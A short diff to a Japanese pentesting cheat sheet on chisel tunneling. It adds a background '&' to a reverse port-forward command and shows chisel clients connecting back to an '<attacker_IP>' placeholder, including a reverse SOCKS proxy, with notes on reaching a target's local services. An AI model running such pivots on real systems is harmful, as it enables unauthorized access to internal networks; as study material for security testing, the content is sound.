@@ -64,7 +64,7 @@ chisel client <attacker_IP>:<バインドポート> R:socks > /dev/null 2>&1 &
 ```
 ```zsh
 # 単純なリモートポートフォワーディングの場合
-chisel client <attacker_IP>:<バインドポート> R:<dest_port>:<dest_IP>:<dest_Port>
+chisel client <attacker_IP>:<バインドポート> R:<dest_port>:<dest_IP>:<dest_Port> &
 ```
 - `R:`：dest_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
 	- 一方で、ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
